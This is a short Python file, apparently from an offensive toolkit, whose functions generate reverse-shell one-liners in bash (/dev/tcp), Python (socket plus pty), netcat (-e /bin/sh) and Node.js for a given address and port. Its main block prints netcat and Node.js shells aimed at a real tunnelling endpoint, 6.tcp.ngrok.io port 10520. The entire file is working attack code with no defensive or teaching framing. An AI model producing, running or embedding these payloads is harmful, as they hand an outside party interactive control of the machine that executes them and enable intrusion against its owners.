def bash(addr, port):
    return f"sh -i >& /dev/tcp/{addr}/{port} 0>&1"


def python(addr, port):
    return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" \
           f"\"{addr}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; " \
           f"pty.spawn(\"/bin/sh\")' "


def netcat(addr, port):
    return f"nc -e /bin/sh {addr} {port}"


def nodejs(addr, port):
    return "node -e '" + f"""
    (function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({port}, "{addr}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
    }})();
    """ + "'"


if __name__ == '__main__':
    print(netcat("6.tcp.ngrok.io", 10520))
    print(nodejs("6.tcp.ngrok.io", 10520))
